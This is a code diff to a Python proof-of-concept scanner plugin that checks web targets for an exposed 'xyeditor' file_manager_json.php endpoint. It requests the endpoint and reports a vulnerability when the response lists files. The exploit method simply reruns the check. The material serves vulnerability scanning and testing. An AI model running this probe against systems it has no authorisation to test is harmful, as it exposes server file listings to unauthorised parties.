@@ -27,24 +27,18 @@ class Poc(ABPoc):
         super(Poc, self).__init__(Vuln())
 
     def verify(self):
-        path = '{target}/system/xyeditor/php/file_manager_json.php?path='.format(target=self.target)
-        self.output.info('扫描路径{0}'.format(path));
+        self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
         try:
+            path = '{target}/system/xyeditor/php/file_manager_json.php?path='.format(target=self.target)
             content = req.get(path)
             if 'file_list' in content.text:
-                self.output.report(self.poc,'{target} 存在 {vulname} 漏洞'.format(
-                    target=self.target, vulname=self.poc.name))
-                
-            else:
-                assert False
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
         except Exception as e:
-            pass
-        self.output.info('未发现任何漏洞')
-        self.output.warn(self.vuln, '发现....')
-        self.output.report(self.vuln, '发现....')
+            self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        pass
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
